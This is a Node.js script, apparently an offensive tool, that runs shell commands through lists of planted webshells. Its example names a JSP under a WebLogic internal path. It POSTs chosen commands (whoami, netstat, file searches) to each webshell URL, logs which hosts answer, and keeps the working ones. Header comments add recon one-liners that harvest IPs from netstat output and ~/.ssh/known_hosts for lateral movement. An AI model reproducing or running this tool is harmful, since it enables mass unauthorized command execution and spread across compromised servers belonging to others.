#!/usr/bin/env node
var fs = require('fs'),
	request = require('request'),
	child_process = require("child_process"),
	program = require('commander');

/**
 *  cat All_netstat.txt|grep -E "[0-9]{3}\."|grep -vE "(127|\(|LISTEN)"|grep -Ev '192.*?192'|grep -v '223'
 * cat ~/.ssh/known_hosts |grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u
 * node tools/doCmdIps.js -f data/Ok1.txt -c 'netstat -ant'
 * node tools/doCmdIps.js -f data/Ok1.txt -c 'find . -name "*.war"|grep -Ev "(bea|uudi|wls|wsat|weblogic)"'
 * 
 */
program.version("parse webshell urls 1.0")
	.option('-f, --file [value]', 'filename')
	.option('-u, --url [value]', 'url')
	.option('-t, --timeout [value]', 'timeout,default 3s')
	.option('-s, --filter [value]', 'filter')
	.option('-o, --out [value]', 'out ok url to file')
	.option('-c, --cmd [value]', 'cmd')
	.on('--help',function()
	{
		console.log("\n\nnode tools/doCmdIps.js -f data/Ok1.txt -c 'netstat -ant'\nnode tools/doCmdIps.js --url 'http://192.16.2.41:7001/bea_wls_internal/.O01542161811034.jsp'  -c 'pwd;ls -la'\n",
		"node tools/doCmdIps.js -f data/Ok1.txt -c 'find . -name \"*.war\"|grep -Ev \"bea|uudi|wls|wsat|weblogic\"'\n\n");
	})
	.parse(process.argv);
	// console.log(program.cmd)
var a = [],
	oIps = {},sFilt = '',
	nTimeout = program.timeout||3,
	szOut = program.out||"data/Ok1.txt",
	szCmd2 = (program.cmd||'whoami');
if(program.file)
	a = fs.readFileSync(program.file || "data/Ok.txt").toString().split(/\n/)
	,sFilt = program.filter||"192.";

var self = process.stdin,data = [];
self.on('readable', function() {
    var chunk = this.read();
    if (chunk != null)
    {
        data.push(chunk);
    }
});
self.on('end', function() {
    program.cmd = data.join("").trim();
});

function fnDoCmd(url,szCmd1,ip1,fnCbk)
{
	var s = '',szCmdX = '';
	if(szCmd1 != "whoami" && -1 < String(oIps[ip1]).indexOf('\\'))
	{
		szCmdX =  "|iconv -f GBK -t UTF-8";
		// console.log(szCmdX)
	}
	request({
			"method":"POST",
			"uri":url,
			headers:{
				"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
				"content-type":"application/x-www-form-urlencoded"
			},
			body:'ls=' + encodeURIComponent(szCmd1||szCmd2)
	},function(e,r,b)
	{
		if(e)console.log(e);
		else
		{
			var s = b;//.replace(/<!--[^>]*?-->/gmi,'');
			if(s && szCmd1 == "whoami")
			{
				oIps[ip1] = s;
			}
			fnCbk(s.trim());
		}
	});
	// var szCmd = "curl -m " + nTimeout + " -s -o- '" + url + "?ls=" + encodeURIComponent(szCmd1||szCmd2) + "' " + szCmdX+ " 2>/dev/null";

	// try{s = child_process.execSync(szCmd).toString();}catch(e){}
	// s = s && s.replace(/<!--[^>]*?-->/gmi,'') || '';
	// if(s && szCmd1 == "whoami")
	// {
	// 	oIps[ip1] = s;
	// }
	// return s.trim();
}

function fnDoUrl(url,ip1,fnCbk)
{
	if(sFilt && -1 == url.indexOf(sFilt))return;
	var ip = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d{1,})*)/gmi.exec(url);
	ip = ip && ip[1] || "";
	
	if(ip1 && oIps[ip1])return;
	szWhoami = "";
	fnCbk || (fnCbk = function(s)
	{
		console.log(s);
	})
	// console.log("[ " + szCmd2 + " ]");
	// fnDoCmd(url,'whoami',ip,function(szWhoami)
	// {
	// 	if(szCmd2 == 'whoami')fnCbk && fnCbk(szWhoami);
	// 	else 
		fnDoCmd(url,szCmd2,ip,function(s)
		{
			if(s)
			{
				oIps[ip] = szWhoami;
				// console.log(ip,"(",szWhoami,")","\n",s);
				// ip + "(" + szWhoami + ")\n" + 
				fnCbk && fnCbk(s);
				if(program.out)
					fs.appendFileSync(szOut, url + "\n");
			}
		});
	// });
}

if(program.url)
	fnDoUrl(program.url);
else
{
	for(var i = 0; i < a.length; i++)
	{
		if(-1 == a[i].indexOf(sFilt))continue;
		var ip = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d{1,})*)/gmi.exec(a[i]);
		ip = ip && ip[1] || "";

		if(oIps[ip])continue;
		fnDoUrl(a[i],ip);
	}
}